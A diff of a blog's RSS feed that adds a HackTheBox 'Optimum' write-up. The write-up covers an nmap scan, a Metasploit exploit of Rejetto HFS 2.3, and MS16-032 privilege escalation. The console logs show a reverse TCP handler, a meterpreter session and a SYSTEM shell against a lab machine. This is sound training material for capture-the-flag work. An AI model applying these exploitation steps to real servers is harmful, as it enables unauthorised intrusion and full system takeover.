@@ -1,12 +1,111 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>HackTheboxes on Terminal</title>
+    <title>HackTheboxes on dim1119&#39;s Blog</title>
     <link>/hackthebox/</link>
-    <description>Recent content in HackTheboxes on Terminal</description>
+    <description>Recent content in HackTheboxes on dim1119&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 01 Apr 2021 17:04:59 +0300</lastBuildDate><atom:link href="/hackthebox/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 07 Apr 2021 22:18:38 +0300</lastBuildDate><atom:link href="/hackthebox/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Optimum</title>
+      <link>/hackthebox/optimum/</link>
+      <pubDate>Wed, 07 Apr 2021 22:18:38 +0300</pubDate>
+      
+      <guid>/hackthebox/optimum/</guid>
+      <description>Enumeration Lets start with nmap:
+nmap -A 10.129.48.247 1 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 17:15 EST Nmap scan report for 10.129.48.247 Host is up (0.079s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.</description>
+      <content>&lt;p&gt;&lt;img src=&#34;/htb/c5021f498be742e184c38de0d3857748.png&#34; alt=&#34;5db61c655fe06715d59df62dc577ebc5.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;Lets start with nmap:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -A 10.129.48.247                                                                         &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⨯
+Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-05 17:15 EST
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.48.247
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.079s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;999&lt;/span&gt; filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 16.99 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Only port 80 is open.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/htb/c87ad1a688a64f87b994fa6bf45d4aa1.png&#34; alt=&#34;b524be7736e8e8b271d44ec03b76c636.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;exploiting-the-web-server&#34;&gt;Exploiting the web server&lt;/h1&gt;
+&lt;p&gt;The website seems to be running Rejetto HttpFileServer 2.3, which is vulnerable to &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/&#34;&gt;RCE&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;After setting the correct parameters we get a shell and the user flag.
+&lt;img src=&#34;/htb/ce4c3ae7d004424b81b42717068ff35e.png&#34; alt=&#34;55a98f1176cb29adb1ac7a627e1fd4b0.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;privelege-escalation&#34;&gt;Privelege Escalation&lt;/h1&gt;
+&lt;p&gt;Lets enumerate to achieve privilege escalation.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;meterpreter &amp;gt; sysinfo 
+Computer        : OPTIMUM
+OS              : Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;2012&lt;/span&gt; R2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6.3 Build 9600&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+Meterpreter     : x86/windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The architecture is x64 and the os is windows 2012 r2. Local exploit suggester works best at x86 architectures but lets try it. After putting session 1 in the background run
+&lt;code&gt;multi/recon/local_exploit_suggester&lt;/code&gt; .&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;windows/local/ms16_032_secondary_logon_handle_privesc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; use post/multi/recon/local_exploit_suggester 
+msf6 post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/recon/local_exploit_suggester&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+msf6 post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/recon/local_exploit_suggester&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; run
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - Collecting local exploits &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x86/windows...
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; exploit checks are being tried...
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.48.247 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Post module execution completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The second module worked (&lt;code&gt;windows/local/ms16_032_secondary_logon_handle_privesc&lt;/code&gt;):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;windows/local/ms16_032_secondary_logon_handle_privesc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; exploit
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.129:4444 
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Compressed size: &lt;span style=&#34;color:#ae81ff&#34;&gt;1016&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Writing payload file, C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\k&lt;/span&gt;ostas&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;ppData&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;emp&lt;span style=&#34;color:#ae81ff&#34;&gt;\Z&lt;/span&gt;IcuZP.ps1...
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Compressing script contents...
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Compressed size: &lt;span style=&#34;color:#ae81ff&#34;&gt;3592&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Executing exploit script...
+     __ __ ___ ___   ___     ___ ___ ___ 
+    |  V  |  _|_  | |  _|___|   |_  |_  |
+    |     |_  |_| |_| . |___| | |_  |  _|
+    |_|_|_|___|_____|___|   |___|___|___|
+                                        
+                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;by b33f -&amp;gt; @FuzzySec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Operating system core count: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Duplicating CreateProcessWithLogonW handle
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Done, using thread handle: &lt;span style=&#34;color:#ae81ff&#34;&gt;1832&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sniffing out privileged impersonation token..
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Thread belongs to: svchost
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Thread suspended
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wiping current impersonation token
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Building SYSTEM impersonation token
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Success, open SYSTEM token handle: &lt;span style=&#34;color:#ae81ff&#34;&gt;2248&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Resuming thread..
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sniffing out SYSTEM shell..
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Duplicating SYSTEM token
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting token race
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting process race
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Holy handle leak Batman, we have a SYSTEM shell!!
+
+MMHBHpbo933bF0v8HT8NeeJN2sTMQfEm
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Executed on target machine.
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sending stage &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;175174&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; to 10.129.48.247
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; opened &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.14.129:4444 -&amp;gt; 10.129.48.247:49164&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-03-05 17:36:56 -0500
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Deleted C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\k&lt;/span&gt;ostas&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;ppData&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;emp&lt;span style=&#34;color:#ae81ff&#34;&gt;\Z&lt;/span&gt;IcuZP.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally we get shell as root and the root flag:
+&lt;img src=&#34;/htb/5e2538c20aa14a8e91a119346d6fe785.png&#34; alt=&#34;1a800bffcd5b68cfc2c6bd09b0756010.png&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Bastion</title>
       <link>/hackthebox/bastion/</link>
